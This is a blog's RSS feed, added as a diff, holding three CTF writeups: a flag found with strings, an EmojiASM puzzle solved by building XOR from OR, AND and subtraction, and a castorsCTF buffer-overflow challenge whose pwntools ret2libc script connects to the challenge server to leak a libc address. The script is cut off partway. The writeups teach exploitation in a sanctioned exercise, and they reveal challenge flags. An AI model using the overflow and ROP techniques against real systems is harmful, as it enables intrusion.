@@ -1,0 +1,789 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on Jacob Shin</title>
+        <link>/posts/</link>
+        <description>Recent content in Posts on Jacob Shin</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <copyright>Jacob Shin</copyright>
+        <lastBuildDate>Mon, 15 Jun 2020 21:06:36 -0400</lastBuildDate>
+        <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>CTF Writeup: Solved in a Flash</title>
+            <link>/posts/ractf-solved_in_a_flash/</link>
+            <pubDate>Mon, 15 Jun 2020 21:06:36 -0400</pubDate>
+            
+            <guid>/posts/ractf-solved_in_a_flash/</guid>
+            <description>Use strings to look for strings in the flash.bin file. Use grep to look for strings with &amp;ldquo;ractf&amp;rdquo; in it.
+$ strings flash.bin | grep ractf ractf{Fl4shDump5Ar3VeryFun!!} </description>
+            <content type="html"><![CDATA[<p>Use strings to look for strings in the flash.bin file. Use grep to look for strings with &ldquo;ractf&rdquo; in it.</p>
+<pre><code class="language-console" data-lang="console">$ strings flash.bin | grep ractf
+ractf{Fl4shDump5Ar3VeryFun!!}
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>CTF Writeup: Return of the EmojASM</title>
+            <link>/posts/ractf-return_of_the_emojiasm/</link>
+            <pubDate>Mon, 15 Jun 2020 21:01:15 -0400</pubDate>
+            
+            <guid>/posts/ractf-return_of_the_emojiasm/</guid>
+            <description>It looks like we have another EmojiASM problem! Note: Depending on what editor/browser you view this on, the emoji&amp;rsquo;s might not be shown properly. That means copying and pasting the emojis might not work well. Try using a browser.
+Problem Description Impressive work. But the emojasm gods have provided you with one more foul challenge. Once again, the web interface should be above.
+Info from the EmojiASM Webpage Architecture  General-purpose registers X and Y (both 8 bits wide) Accumulator Register A (8 bits wide) 3x Tape Drives, T0 T1 and T2 (descibed below), each with the following:  1 input buffer register (TnI) 1 ouput buffer register (TnO) 1 write flag (TnW)   Obviously each tape drive has a position on the tape as well, which changes as the tape gets moved.</description>
+            <content type="html"><![CDATA[<p>It looks like we have another EmojiASM problem!
+Note: Depending on what editor/browser you view this on, the emoji&rsquo;s might not be shown properly. That means copying and pasting the emojis might not work well. Try using a browser.</p>
+<h2 id="problem-description">Problem Description</h2>
+<p>Impressive work. But the emojasm gods have provided you with one more foul challenge. Once again, the web interface should be above.</p>
+<h2 id="info-from-the-emojiasm-webpage">Info from the EmojiASM Webpage</h2>
+<h3 id="architecture">Architecture</h3>
+<ul>
+<li>General-purpose registers X and Y (both 8 bits wide)</li>
+<li>Accumulator Register A (8 bits wide)</li>
+<li>3x Tape Drives, T0 T1 and T2 (descibed below), each with the following:
+<ul>
+<li>1 input buffer register (TnI)</li>
+<li>1 ouput buffer register (TnO)</li>
+<li>1 write flag (TnW)</li>
+</ul>
+</li>
+<li>Obviously each tape drive has a position on the tape as well, which changes as the tape gets moved. (TnP)</li>
+</ul>
+<p>&ldquo;n&rdquo; here refers to the tape id, so for instance the input buffer register of tape 2 (T2) is known as T2I.</p>
+<h3 id="tape-drive-details">Tape drive details</h3>
+<p>Each tape drive supports the following operations:</p>
+<ul>
+<li>Forward - move the tape forward one space (and other things, described below)</li>
+<li>Backward - move the tape backward one space</li>
+<li>Rewind - reset the tape&rsquo;s position to 0, and clear both buffers and the write flag.</li>
+<li>Set-write - write a byte to the output buffer and set the write flag.</li>
+</ul>
+<p>The forward operation is special because it also does the following:</p>
+<ul>
+<li>Reads the data in the space it has just passed over into the input buffer register</li>
+<li>If the write flag is set:
+<ul>
+<li>Write the data in the output buffer register to the byte just passed over</li>
+<li>Clear the write flag</li>
+</ul>
+</li>
+</ul>
+<p>None of those things happen when going backwards, and this is the only way to read and write to or from any tape.</p>
+<p>Each tape drive is 256 bytes long. Trying to move forwards or backwards past the end of the tape has no effect.</p>
+<p>Read more about EmojiASM <a href="https://gist.github.com/Bentechy66/bce063ee26bb0ec2ae664d506ed28ad0#file-emojasm_16bitjmp_spec-md">here</a>.</p>
+<h2 id="approach">Approach</h2>
+<p>Basically we just have to xor each byte from tape0 with a byte from tape1.
+Unfortunately we EmojiASM doesn&rsquo;t have an xor instruction. All the bitwise operations we have are <code>&amp;</code> and <code>|</code>.</p>
+<p>Fortunately, we can use a combination of the given operations to create something that&rsquo;s equivalent to the xor operation.
+After some searching, I come across this stack overflow <a href="https://stackoverflow.com/questions/4715232/xor-from-only-or-and-and">post</a>.</p>
+<p>After scrolling through the various answers, it seems like <a href="https://stackoverflow.com/a/47588032/9512643">this</a> is the easiest to implement in emojiasm.
+We&rsquo;ll use this to replace xor</p>
+<pre><code>a ^ b  = (a | b) - (a &amp; b)
+</code></pre><h2 id="read-data-off-of-tape0-and-tape1">Read data off of Tape0 and Tape1</h2>
+<p>We&rsquo;ll be using the practice mode first to make sure our asm actually works (make sure to check the &ldquo;Include debug output&rdquo; option).
+First, let&rsquo;s see if we can read some of the data on tape0 and tape1.</p>
+<p>Let&rsquo;s read from T1 first:</p>
+<pre><code>➡️🎞️             Move T1 forward        puts one character into T1I
+👁️🎞️            A &lt;- T1I               move the character in T1I into the Accumulator Register A
+📤              output &lt;- chr(A)       print out what's in A
+</code></pre><p>We can put all the instructions in a compact line like this <code>➡️🎞️👁️🎞️📤</code>.
+Let&rsquo;s see what&rsquo;s on T1 by stringing a bunch of these together:</p>
+<pre><code>➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤➡️🎞️👁️🎞️📤
+</code></pre><p>We get the following output</p>
+<pre><code>Your program has been run successfully!
+
+The output was:
+
+xorkeyxork
+</code></pre><p>Let&rsquo;s try doing the same for T0:</p>
+<pre><code>➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤➡️📼👁️📼📤
+</code></pre><p>Output:</p>
+<pre><code>Your program has been run successfully!
+
+The output was:
+
+⏽⏽⏽⏽⏽
+⏽
+</code></pre><p>It looks like Tape0 has non ASCII characters. Let&rsquo;s add 0x30 to each character from tape0 to make them viewable.
+For example, if tape0 had <code>0</code> in the first byte, we would add 0x30 before displaying it. <code>chr(0 + 0x30) = &quot;0&quot;</code>. Then we would see <code>&quot;0&quot;</code> instead of <code>⏽</code>.</p>
+<pre><code>➡️📼             Move T0 forward         Puts one byte into T0I
+👁️📼            A &lt;- T0I                Move the byte in T0I into the Accumulator Register A
+📦🔨            X &lt;- A                  Put what's in A into X 
+✉️😃😀           A &lt;- 0x30               Puts 0x30 into A
+➕🔨            A &lt;- A + X              Adds X to A
+📤              out &lt;- chr(A)           Outputs A
+</code></pre><p>The pseudocode below is equivalenet to the above</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">A <span style="color:#f92672">=</span> T0I <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>
+print(A)
+</code></pre></div><p>Make the above emojiasm more compact: <code>➡️📼👁️📼📦🔨✉️😃😀➕🔨📤</code>
+And string a bunch together to read tape1:</p>
+<pre><code>➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤➡️📼👁️📼📦🔨✉️😃😀➕🔨📤
+</code></pre><p>Output:</p>
+<pre><code>Your program has been run successfully!
+
+The output was:
+
+:&gt;AO32&lt;:1O
+
+</code></pre><p>So the first byte on tape0 is 10 since <code>ord(&quot;:&quot;) - 0x30 = 10</code></p>
+<p>Let&rsquo;s see what the first character of the flag should be by xoring the first byte from tape0 (10) with the first byte from tape1 (ord(&ldquo;x&rdquo;)):</p>
+<pre><code class="language-console" data-lang="console">$ python -c 'print chr(10 ^ ord(&quot;x&quot;))'
+r
+</code></pre><p>As we expected, the first character of the flag is <code>r</code>.</p>
+<h2 id="implement-subtraction">Implement Subtraction</h2>
+<p>Now we can use <code>a ^ b  = (a | b) - (a &amp; b)</code> to implement an xor function. However, emojiasm doesn&rsquo;t have a subtract operation, only a decrement op.<br>
+So we have to first create a way to subtract before we make implement xor.</p>
+<p>The following code subtracts 0x02 from 0x43 and stores the result in T2:</p>
+<pre><code>01: ✉️😄😃               A &lt;- 0x43 
+02: ✏️🎥                 T2O &lt;- A
+03: ➡️🎥                 T2 &lt;- T2O
+04: T2[0] = 0x43
+05:
+06: ✉️😀😂               A &lt;- 0x02
+07: 📦🔨                X &lt;- A
+08: X = 0x2
+09: 
+10: ✉️😀😀               A &lt;- 0
+11: 📦⛏️                 Y &lt;- A
+12: Y = 0
+13: 
+14: ⏪🎥                Rewind T2
+15: ➡️🎥👁️🎥             A &lt;- T2               
+16: 🦔🗃️                A &lt;- A - 1
+17: ⏪🎥                Rewind T2
+18: ✏️🎥                 T2O &lt;- A
+19: ➡️🎥                 T2 &lt;- T2O
+20: A = T2[0]
+21: A -= 1
+22: T2[0] = A
+23: 
+24: 💡⛏️                 Y &lt;- Y + 1
+25: 🎁⛏️                 A &lt;- Y
+26: ❓🔨                flags ← cmp(X, A)
+27: 🐇😀😀😁😅          RJMP &lt;- value
+28: 🏷️                  {if flags.EQ not set} PC ← RJMP
+29: Y += 1
+30: if y != A:
+31:     goto 14
+</code></pre><p>An uncommented version of the above:</p>
+<pre><code>✉️😄😃
+✏️🎥
+➡️🎥
+✉️😀😂
+📦🔨
+⏪🎥
+➡️🎥👁️🎥
+🦔🗃️
+⏪🎥
+✏️🎥
+➡️🎥
+💡⛏️
+🎁⛏️
+❓🔨
+🐇😀😀😁😅
+🏷️
+</code></pre><p>Let&rsquo;s run the above asm:</p>
+<pre><code>Your program has been run successfully!
+
+The output was:
+
+
+--Debug output
+
+1-4: OP.LDA with args: ['😄', '😃']
+6-8: OP.TOUT with args: 🎥
+10-12: OP.TF with args: 🎥
+14-17: OP.LDA with args: ['�', '😂']
+18-20: OP.TAR with args: 🔨
+21-23: OP.TRW with args: 🎥
+25-27: OP.TF with args: 🎥
+28-30: OP.TIN with args: 🎥
+31-34: OP.DEC with args: 🗃️
+35-37: OP.TRW with args: 🎥
+39-41: OP.TOUT with args: 🎥
+43-45: OP.TF with args: 🎥
+46-49: OP.INC with args: ⛏️
+50-53: OP.TRA with args: ⛏️
+54-56: OP.CMP with args: 🔨
+57-62: OP.LDJMP with args: ['�', '�', '😁', '😅']
+[OP.LDJMP] - Setting RJMP to 21 for ldjmp [0x0, 0x0, 0x1, 0x5]
+64-65: OP.JMPNEQ with args: None
+[OP.JMPNEQ] - Setting PC to 21
+21-23: OP.TRW with args: 🎥
+25-27: OP.TF with args: 🎥
+28-30: OP.TIN with args: 🎥
+31-34: OP.DEC with args: 🗃️
+35-37: OP.TRW with args: 🎥
+39-41: OP.TOUT with args: 🎥
+43-45: OP.TF with args: 🎥
+46-49: OP.INC with args: ⛏️
+50-53: OP.TRA with args: ⛏️
+54-56: OP.CMP with args: 🔨
+57-62: OP.LDJMP with args: ['�', '�', '😁', '😅']
+[OP.LDJMP] - Setting RJMP to 21 for ldjmp [0x0, 0x0, 0x1, 0x5]
+64-65: OP.JMPNEQ with args: None
+Halting (pc: 65, maxidx: 64)
+</code></pre><blockquote>
+<p>Jumping:
+Program memory offsets are the number of characters (unicode codepoints) from the start of the file. This takes into account emojis that are actually multiple codepoints, so beware.</p>
+</blockquote>
+<p>If you have any problems or errors running the above code, make sure to remove any extraneous spaces. Any extra character will throw the jump offset off (see the above quote). Here we set the jump to 21 since the first OP.TRW (rewind) instruction is at 21.
+If you have extra spaces or extra characters, you might need to adjust the offset to whereever the first rewind instruction is.</p>
+<pre><code>⏪🎥                Rewind tape2
+➡️🎥👁️🎥             A &lt;- one chr of tape2
+📤                  out &lt;- chr(A)
+</code></pre><p>The full subtraction code with output:</p>
+<pre><code>✉️😄😃
+✏️🎥
+➡️🎥
+✉️😀😂
+📦🔨
+⏪🎥
+➡️🎥👁️🎥
+🦔🗃️
+⏪🎥
+✏️🎥
+➡️🎥
+💡⛏️
+🎁⛏️
+❓🔨
+🐇😀😀😁😅
+🏷️
+⏪🎥
+➡️🎥👁️🎥  
+📤
+</code></pre><p>Output:</p>
+<pre><code>Your program has been run successfully!
+The output was:
+A
+</code></pre><p>The program prints out <code>A</code>, which is the expected result since 0x43 - 2 = 0x41 and chr(0x41) = &ldquo;A&rdquo;.</p>
+<h2 id="implement-xor">Implement XOR</h2>
+<p>Now that our test subtraction program works, we use it to implement xor.
+We&rsquo;ll basically use the following forumla and imlement that: a ^ b  = (a | b) - (a &amp; b)
+Note: In the pseudocode below, <code>i</code> is just the current index or current position on the tape
+When the program first starts, the i = 0, since the program starts at the beginning of each tape.
+Everytime we read, i is incremented since the position on the tape is also incremented.</p>
+<pre><code>01: ➡️📼👁️📼                     A &lt;- one chr of tape0
+02: 📦🔨                        X &lt;- A
+03: ➡️🎞️👁️🎞️                     A &lt;- one chr of tape1
+04: 🎷🔨                        A &lt;- A | X
+05: ⏪🎥                        Rewind Tape2
+06: ✏️🎥                         T2O &lt;- A
+07: ➡️🎥                         T2 &lt;- T2O (output buf of T2)
+08: T2[0] = tape1[i] | tape0[i]
+09: 
+10: ⬅️📼⬅️🎞️                      Move T1 and T0 backwards by 1 since reading from the tapes moves the position forward
+11: ➡️📼👁️📼                     A &lt;- one chr of tape0
+12: 📦🔨                        X &lt;- A
+13: ➡️🎞️👁️🎞️                     A &lt;- one chr of tape1
+14: 🍴🔨                        A &lt;- A &amp; X
+15: 📦🔨                        X &lt;- A
+16: ✉️😀😀                       A &lt;- 0
+17: 📦⛏️                         Y &lt;- A
+18: X = T1[i] &amp; T0[i]
+20: Y = 0
+21: 
+22: ⏪🎥                        Rewind T2
+23: ➡️🎥👁️🎥                     A &lt;- T2               
+24: 🦔🗃️                        A &lt;- A - 1
+25: ⏪🎥                        Rewind T2
+26: ✏️🎥                         T2O &lt;- A
+27: ➡️🎥                         T2 &lt;- T2O
+28: A = T2[0]
+29: T2[0] = A - 1
+30: 
+31: 💡⛏️                         Y &lt;- Y + 1
+32: 🎁⛏️                         A &lt;- Y
+33: ❓🔨                        flags ← cmp(X, A)
+34: 🐇😀😀                  RJMP &lt;- value
+35: 🏷️                          {if flags.EQ not set} PC ← RJMP
+36: Y += 1
+37: if X != Y:
+38:     goto 22
+</code></pre><p>Uncommented version of above:</p>
+<pre><code>➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🎷🔨
+⏪🎥
+✏️🎥
+➡️🎥
+⬅️📼⬅️🎞️
+➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🍴🔨
+📦🔨
+✉️😀😀
+📦⛏️
+⏪🎥
+➡️🎥👁️🎥
+🦔🗃️
+⏪🎥
+✏️🎥
+➡️🎥
+💡⛏️
+🎁⛏️
+❓🔨
+🐇😀😀😄😋
+🏷️
+</code></pre><p>Just like in the subtraction program, we set the jump offset to where the first rewind instruction is (OP.TRW) which in this case is 75 or 0x4b.</p>
+<p>Now let&rsquo;s make sure the program is actually working by printing out the first byte in T2. We&rsquo;ll use this code snippet from earlier to print out the first byte of T2:</p>
+<pre><code>⏪🎥
+➡️🎥👁️🎥  
+📤
+</code></pre><p>Now combine the output code with the xor implementation:</p>
+<pre><code>➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🎷🔨
+⏪🎥
+✏️🎥
+➡️🎥
+⬅️📼⬅️🎞️
+➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🍴🔨
+📦🔨
+✉️😀😀
+📦⛏️
+⏪🎥
+➡️🎥👁️🎥
+🦔🗃️
+⏪🎥
+✏️🎥
+➡️🎥
+💡⛏️
+🎁⛏️
+❓🔨
+🐇😀😀😄😋
+🏷️
+⏪🎥
+➡️🎥👁️🎥  
+📤
+</code></pre><p>Ouput</p>
+<pre><code>Your program has been run successfully!
+
+The output was:
+
+r
+</code></pre><p>We&rsquo;ve got the first letter of the flag!
+Now all we have to do is copy and paste the above code snippet about 4 times:</p>
+<pre><code>➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🎷🔨
+⏪🎥
+✏️🎥
+➡️🎥
+⬅️📼⬅️🎞️
+➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🍴🔨
+📦🔨
+✉️😀😀
+📦⛏️
+⏪🎥
+➡️🎥👁️🎥
+🦔🗃️
+⏪🎥
+✏️🎥
+➡️🎥
+💡⛏️
+🎁⛏️
+❓🔨
+🐇😀😀😄😋
+🏷️
+⏪🎥
+➡️🎥👁️🎥  
+📤
+
+➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🎷🔨
+⏪🎥
+✏️🎥
+➡️🎥
+⬅️📼⬅️🎞️
+➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🍴🔨
+📦🔨
+✉️😀😀
+📦⛏️
+⏪🎥
+➡️🎥👁️🎥
+🦔🗃️
+⏪🎥
+✏️🎥
+➡️🎥
+💡⛏️
+🎁⛏️
+❓🔨
+🐇😀😀😄😋
+🏷️
+⏪🎥
+➡️🎥👁️🎥  
+📤
+
+➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🎷🔨
+⏪🎥
+✏️🎥
+➡️🎥
+⬅️📼⬅️🎞️
+➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🍴🔨
+📦🔨
+✉️😀😀
+📦⛏️
+⏪🎥
+➡️🎥👁️🎥
+🦔🗃️
+⏪🎥
+✏️🎥
+➡️🎥
+💡⛏️
+🎁⛏️
+❓🔨
+🐇😀😀😄😋
+🏷️
+⏪🎥
+➡️🎥👁️🎥  
+📤
+
+➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🎷🔨
+⏪🎥
+✏️🎥
+➡️🎥
+⬅️📼⬅️🎞️
+➡️📼👁️📼
+📦🔨
+➡️🎞️👁️🎞️
+🍴🔨
+📦🔨
+✉️😀😀
+📦⛏️
+⏪🎥
+➡️🎥👁️🎥
+🦔🗃️
+⏪🎥
+✏️🎥
+➡️🎥
+💡⛏️
+🎁⛏️
+❓🔨
+🐇😀😀😄😋
+🏷️
+⏪🎥
+➡️🎥👁️🎥  
+📤
+</code></pre><p>Output</p>
+<pre><code>Your program has been run successfully!
+
+The output was:
+
+ractf{testing_flag}
+The expected output was:
+
+ractf{testingflag}
+This was a match.
+</code></pre><p>We&rsquo;ve got the whole flag!
+Running the code just 4 times is able to produce the whole flag since the jump offset is constant at 75, which means that after we execute the 1st block, we&rsquo;ll loop to the beginning.</p>
+<p>Runnning the above code on the actual challenge works and gives us the real flag.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>CTF Writeup: Babybof1 Pt2</title>
+            <link>/posts/castorsctf-babybof1pt2/</link>
+            <pubDate>Mon, 15 Jun 2020 20:58:24 -0400</pubDate>
+            
+            <guid>/posts/castorsctf-babybof1pt2/</guid>
+            <description>The Problem Description: Ghidra Decompilation: As we can see from the above decompilation, the vulnerability in the program is gets().
+The call to gets() doesn&amp;rsquo;t check to make sure our input will fit into the buffer we give it,
+so we can write past the length of the buffer, leading to a classic buffer overflow vulnerability.
+The gets() means we the input can contain any character, even \x00, except for newlines.</description>
+            <content type="html"><![CDATA[<h2 id="the-problem-description">The Problem Description:</h2>
+<p><img src="problem.png" alt="Problem Description"></p>
+<h2 id="ghidra-decompilation">Ghidra Decompilation:</h2>
+<p><img src="ghidra.png" alt="Ghidra"></p>
+<p>As we can see from the above decompilation, the vulnerability in the program is <code>gets()</code>.<br>
+The call to gets() doesn&rsquo;t check to make sure our input will fit into the buffer we give it,<br>
+so we can write past the length of the buffer, leading to a classic buffer overflow vulnerability.<br>
+The gets() means we the input can contain any character, even \x00, except for newlines.</p>
+<p>Let&rsquo;s check what kind of binary we have and what protections it has.</p>
+<pre><code class="language-console" data-lang="console">$ wget https://castorsctf20.ctfd.io/files/10d1b0797feecefc95e7660be8bbbab4/babybof?token=eyJ1c2VyX2lkIjo3MzMsInRlYW1faWQiOjMyMSwiZmlsZV9pZCI6MTExfQ.XtPiqA.baXDvvhSBLjPBNCcxZqEx05bqY8 -O bof
+$ file bof
+bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,  
+interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,  
+BuildID[sha1]=53082227c9e25222032055ccb700576121bd384f, not stripped
+$ checksec --file=bof
+[*] 'bof'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+
+</code></pre><p>The binary is a 64 bit ELF binary.</p>
+<ul>
+<li>Partial RELRO (Relocation Read-Only): PLT GOT entries are still writeable.</li>
+<li>No canary: We can safely overwrite the saved return address without worrying about overwriting a stack canary.</li>
+<li>NX disabled: The stack is executable, so we could use shellcode if we wanted.</li>
+<li>No PIE: No ASLR in the binary itself, so addresses of functions like main will remain constant. However, the actual machine we run the binary on still will probably have ASLR enabled which means the stack addresses will change.</li>
+</ul>
+<p>First I tried using shellcode, but since ASLR is still enabled on the machine, the stack addresses will be randomized.<br>
+This means that the address of the input buffer will change. I didn&rsquo;t know how to overwrite the return address with the correct address of the shellcode, so I just decided to use ret2libc. (Note: I think using shellcode was the intended solution and not ret2libc).<br>
+Libc is a standard C library with all sort of useful functions. A ret2libc attack can take advantage of functions like system() in libc to spawn a shell.</p>
+<p>The first step is to determine how much input we need to overwrite the return address.<br>
+The stack should look like this for main().</p>
+<pre><code>[    Saved Return Address   ]
+[ Saved Frame Pointer (EBP) ]
+[         Buffer[255]       ]
+[         Buffer[254]       ]
+[         Buffer[253]       ]
+       . . . . . . . . 
+[         Buffer[2]         ]
+[         Buffer[1]         ]
+[         Buffer[0]         ]
+
+</code></pre><p>We want to write past the buffer, overwrite the saved fram pointer, and then overwrite the saved return address our own address to our exploit.<br>
+We know that the buffer is 256 bytes from Ghidra, so we can use the following to test how much padding we need until we overwrite the return address.<br>
+In the diagram above, writing to buffer will make input go &ldquo;up&rdquo; the stack.</p>
+<pre><code class="language-console" data-lang="console">$ python -c 'print &quot;A&quot;*256 + &quot;B&quot;*8 + &quot;C&quot;*8 + &quot;D&quot;*8 + &quot;E&quot;*8' &gt; /tmp/asdf # Saves output to a file
+$ gdb ./bof
+(gdb) r &lt; /tmp/asdf # Runs with contents of asdf as the input 
+Welcome to the cybercastors Babybof
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000040078b in main ()
+(gdb) x/i $rip
+=&gt; 0x40078b &lt;main+62&gt;:	req 
+</code></pre><p>We receive a segfault when we the binary with our input. It seems we stop at the ret instruction in main.<br>
+A ret instruction is like pop rip, so let&rsquo;s what the ret instruction was trying to get from the stack.</p>
+<pre><code class="language-console" data-lang="console">(gdb) x/gx $rsp
+0x7fffffffdee8:	0x4343434343434343
+</code></pre><p>It looks like the program was trying to return to the address <code>0x4343434343434343</code> which is probably why we got a segfault.<br>
+Since 0x43 is an ascii C, we know that the stack will look like this after gets() is called:</p>
+<pre><code>[ Saved ret   CCCCCCCC        ]
+[ Saved EBP   BBBBBBBB        ]
+[ Buffer:     A*256           ]
+</code></pre><p>Now we just have to replace CCCCCCCC with the address of our exploit. We&rsquo;ll use a ROP (Return Oriented Programming) Chain to accomplish this.</p>
+<h2 id="ret2libc">Ret2libc</h2>
+<p>I used <a href="https://tasteofsecurity.com/security/ret2libc-unknown-libc/">this</a> as a template for my 64-bit ret2libc attacks. Check the post out since it explains the basics of ret2libc pretty well.</p>
+<h3 id="leak-libc">Leak Libc</h3>
+<p>First we need to leak a libc function address. ASLR is enabled on the machine, so the address of libc functions will be randomized. In order to know the address of system() and other libc functions, we need to first find the base address of libc.<br>
+We can use puts or printf to leak the address of a libc function. Puts is easier to use though, so we&rsquo;ll use that in this challenge.<br>
+We&rsquo;ll be leaking the address of the <code>__libc_start_main</code> function and then subtracting the offset to calculate the base of libc. Then using the base of libc we can calculate where system() and the &ldquo;/bin/sh&rdquo; string is.</p>
+<p>Here&rsquo;s our ROP chain:</p>
+<pre><code>[Address of pop rdi, ret] [Address of __libc_start_main entry] [Address of puts] 
+</code></pre><p>64-bit calling conventions say that the first argument of a function should be in the rdi register.<br>
+So our rop chain will put the address of the <code>__libc_start_main</code> entry into rdi and then call puts, printing out the address of <code>__libc_start_main</code>.</p>
+<p>This is what the stack will look with our ROP chain:</p>
+<pre><code>[         Address of puts          ] 
+[Address of __libc_start_main entry]
+[      Address of pop rdi, ret     ]  
+[      Buffer:     A*256           ]
+</code></pre><p>Here&rsquo;s our script to leak <code>__libc_start_main</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#e6db74">&#34;&#34;&#34; The following script was based heavily on the script provided in the following url &#34;&#34;&#34;</span>
+<span style="color:#e6db74">&#34;&#34;&#34;           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              &#34;&#34;&#34;</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span> <span style="color:#75715e"># Import pwntools</span>
+
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chals20.cybercastors.com&#34;</span>, <span style="color:#ae81ff">14425</span>) <span style="color:#75715e"># Connect to the remote server</span>
+<span style="color:#75715e">#p = process(&#34;./bof&#34;) # start the vuln binary</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./bof&#34;</span>) <span style="color:#75715e"># Extract data from binary</span>
+rop <span style="color:#f92672">=</span> ROP(elf) <span style="color:#75715e"># Find ROP gadgets</span>
+
+<span style="color:#75715e"># Find addresses for puts, __libc_start_main and a `pop rdi;ret` gadget</span>
+PUTS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+LIBC_START_MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
+POP_RDI <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>] <span style="color:#75715e"># Same as ROPgadget --binary vuln | grep &#34;pop rdi&#34;</span>
+MAIN <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
+RET <span style="color:#f92672">=</span> (rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>]))[<span style="color:#ae81ff">0</span>]
+
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;puts@plt: &#34;</span> <span style="color:#f92672">+</span> hex(PUTS))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;__libc_start_main: &#34;</span> <span style="color:#f92672">+</span> hex(LIBC_START_MAIN))
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;pop rdi gadget: &#34;</span> <span style="color:#f92672">+</span> hex(POP_RDI))
+
+base <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#75715e">#Overflow buffer until return address</span>
+<span style="color:#75715e"># Create rop chain</span>
+rop <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span>  p64(POP_RDI) <span style="color:#f92672">+</span> p64(LIBC_START_MAIN) <span style="color:#f92672">+</span>  p64(PUTS)
+
+<span style="color:#75715e">#Send our rop-chain payload</span>
+p<span style="color:#f92672">.</span>sendline(rop)
+
+<span style="color:#75715e">#Parse leaked address</span>
+print(p<span style="color:#f92672">.</span>recvline())
+print(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;name: &#34;</span>))
+received <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()
+received <span style="color:#f92672">=</span> received<span style="color:#f92672">.</span>strip()
+print(received)
+leak <span style="color:#f92672">=</span> u64(received<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
